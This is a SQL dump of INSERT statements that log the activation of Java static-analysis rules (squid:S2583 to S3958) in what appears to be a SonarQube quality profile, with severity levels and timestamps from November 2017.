INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3140, '2017-11-20 12:20:23.163', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S2583;ruleKey=squid:S2583;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX0_7bbGRdfPp-rOo');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3141, '2017-11-20 12:20:23.2', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S2589;ruleKey=squid:S2589;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX1AgbbGRdfPp-rOp');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3142, '2017-11-20 12:20:23.263', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S2629;ruleKey=squid:S2629;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX1BfbbGRdfPp-rOq');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3143, '2017-11-20 12:20:23.294', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S2637;ruleKey=squid:S2637;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX1B-bbGRdfPp-rOr');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3144, '2017-11-20 12:20:23.318', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S2638;ruleKey=squid:S2638;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX1CWbbGRdfPp-rOs');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3145, '2017-11-20 12:20:23.36', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S2639;ruleKey=squid:S2639;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX1DAbbGRdfPp-rOt');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3146, '2017-11-20 12:20:23.406', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S2653;ruleKey=squid:S2653;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX1DubbGRdfPp-rOu');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3147, '2017-11-20 12:20:23.456', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S2674;ruleKey=squid:S2674;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX1EgbbGRdfPp-rOv');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3148, '2017-11-20 12:20:23.532', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S2675;ruleKey=squid:S2675;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX1FsbbGRdfPp-rOw');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3149, '2017-11-20 12:20:23.581', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S2676;ruleKey=squid:S2676;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX1GdbbGRdfPp-rOx');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3150, '2017-11-20 12:20:23.628', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S2677;ruleKey=squid:S2677;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX1HLbbGRdfPp-rOy');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3151, '2017-11-20 12:20:23.682', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S2681;ruleKey=squid:S2681;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX1ICbbGRdfPp-rOz');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3152, '2017-11-20 12:20:23.746', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S2692;ruleKey=squid:S2692;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX1JBbbGRdfPp-rO0');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3153, '2017-11-20 12:20:23.817', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S2695;ruleKey=squid:S2695;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX1KJbbGRdfPp-rO1');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3154, '2017-11-20 12:20:23.849', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S2696;ruleKey=squid:S2696;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX1KpbbGRdfPp-rO2');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3155, '2017-11-20 12:20:23.9', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S2718;ruleKey=squid:S2718;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX1LcbbGRdfPp-rO3');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3156, '2017-11-20 12:20:23.952', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S2737;ruleKey=squid:S2737;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX1MQbbGRdfPp-rO4');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3157, '2017-11-20 12:20:24.001', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S2757;ruleKey=squid:S2757;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX1NBbbGRdfPp-rO5');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3158, '2017-11-20 12:20:24.053', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S2786;ruleKey=squid:S2786;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX1N1bbGRdfPp-rO6');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3159, '2017-11-20 12:20:24.136', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S2789;ruleKey=squid:S2789;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX1PIbbGRdfPp-rO7');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3160, '2017-11-20 12:20:24.184', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S2864;ruleKey=squid:S2864;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX1P4bbGRdfPp-rO8');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3161, '2017-11-20 12:20:24.223', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S2885;ruleKey=squid:S2885;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX1QfbbGRdfPp-rO9');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3162, '2017-11-20 12:20:24.28', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S2886;ruleKey=squid:S2886;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX1RYbbGRdfPp-rO-');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3163, '2017-11-20 12:20:24.332', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S2912;ruleKey=squid:S2912;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX1SMbbGRdfPp-rO_');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3164, '2017-11-20 12:20:24.381', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S2924;ruleKey=squid:S2924;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX1S9bbGRdfPp-rPA');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3165, '2017-11-20 12:20:24.437', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S2925;ruleKey=squid:S2925;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX1T1bbGRdfPp-rPB');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3166, '2017-11-20 12:20:24.492', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S2970;ruleKey=squid:S2970;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX1UsbbGRdfPp-rPC');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3167, '2017-11-20 12:20:24.571', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S2975;ruleKey=squid:S2975;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX1V6bbGRdfPp-rPD');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3168, '2017-11-20 12:20:24.654', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S2976;ruleKey=squid:S2976;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX1XObbGRdfPp-rPE');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3169, '2017-11-20 12:20:24.763', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S3008;ruleKey=squid:S3008;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;param_format=^[a-z][a-zA-Z0-9]*$;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX1Y7bbGRdfPp-rPF');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3170, '2017-11-20 12:20:24.873', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S3010;ruleKey=squid:S3010;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX1apbbGRdfPp-rPG');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3171, '2017-11-20 12:20:24.996', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S3020;ruleKey=squid:S3020;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX1ckbbGRdfPp-rPH');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3172, '2017-11-20 12:20:25.043', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S3027;ruleKey=squid:S3027;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX1dTbbGRdfPp-rPI');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3173, '2017-11-20 12:20:25.088', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S3034;ruleKey=squid:S3034;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX1eAbbGRdfPp-rPJ');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3174, '2017-11-20 12:20:25.137', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S3038;ruleKey=squid:S3038;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX1exbbGRdfPp-rPK');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3175, '2017-11-20 12:20:25.189', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S3042;ruleKey=squid:S3042;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX1flbbGRdfPp-rPL');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3176, '2017-11-20 12:20:25.249', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S3046;ruleKey=squid:S3046;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX1ghbbGRdfPp-rPM');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3177, '2017-11-20 12:20:25.288', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S3066;ruleKey=squid:S3066;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX1hIbbGRdfPp-rPN');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3178, '2017-11-20 12:20:25.336', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S3067;ruleKey=squid:S3067;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX1h4bbGRdfPp-rPO');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3179, '2017-11-20 12:20:25.386', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S3281;ruleKey=squid:S3281;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX1ipbbGRdfPp-rPP');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3180, '2017-11-20 12:20:25.437', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S3346;ruleKey=squid:S3346;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX1jdbbGRdfPp-rPQ');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3181, '2017-11-20 12:20:25.487', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S3355;ruleKey=squid:S3355;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX1kPbbGRdfPp-rPR');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3182, '2017-11-20 12:20:25.54', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S3358;ruleKey=squid:S3358;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX1lEbbGRdfPp-rPS');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3183, '2017-11-20 12:20:25.598', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S3398;ruleKey=squid:S3398;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX1l-bbGRdfPp-rPT');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3184, '2017-11-20 12:20:25.657', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S3400;ruleKey=squid:S3400;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX1m5bbGRdfPp-rPU');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3185, '2017-11-20 12:20:25.726', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S3415;ruleKey=squid:S3415;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX1n-bbGRdfPp-rPV');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3186, '2017-11-20 12:20:25.796', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S3421;ruleKey=squid:S3421;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX1pEbbGRdfPp-rPW');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3187, '2017-11-20 12:20:25.945', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S3422;ruleKey=squid:S3422;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX1rZbbGRdfPp-rPX');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3188, '2017-11-20 12:20:26', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S3436;ruleKey=squid:S3436;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX1sQbbGRdfPp-rPY');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3189, '2017-11-20 12:20:26.049', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S3437;ruleKey=squid:S3437;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX1tBbbGRdfPp-rPZ');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3190, '2017-11-20 12:20:26.104', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S3438;ruleKey=squid:S3438;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX1t4bbGRdfPp-rPa');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3191, '2017-11-20 12:20:26.137', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S3457;ruleKey=squid:S3457;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX1uZbbGRdfPp-rPb');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3192, '2017-11-20 12:20:26.185', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S3516;ruleKey=squid:S3516;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX1vJbbGRdfPp-rPc');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3193, '2017-11-20 12:20:26.224', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S3518;ruleKey=squid:S3518;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX1vwbbGRdfPp-rPd');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3194, '2017-11-20 12:20:26.284', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S3599;ruleKey=squid:S3599;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX1wsbbGRdfPp-rPe');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3195, '2017-11-20 12:20:26.316', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S3631;ruleKey=squid:S3631;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX1xMbbGRdfPp-rPf');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3196, '2017-11-20 12:20:26.363', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S3655;ruleKey=squid:S3655;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX1x7bbGRdfPp-rPg');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3197, '2017-11-20 12:20:26.408', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S3725;ruleKey=squid:S3725;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX1yobbGRdfPp-rPh');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3198, '2017-11-20 12:20:26.448', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S3776;ruleKey=squid:S3776;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;param_Threshold=15;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX1zQbbGRdfPp-rPi');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3199, '2017-11-20 12:20:26.503', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S3824;ruleKey=squid:S3824;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX10HbbGRdfPp-rPj');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3200, '2017-11-20 12:20:26.569', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S3878;ruleKey=squid:S3878;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX11JbbGRdfPp-rPk');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3201, '2017-11-20 12:20:26.646', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S3923;ruleKey=squid:S3923;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX12WbbGRdfPp-rPl');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (3202, '2017-11-20 12:20:26.749', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S3958;ruleKey=squid:S3958;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZX139bbGRdfPp-rPm');
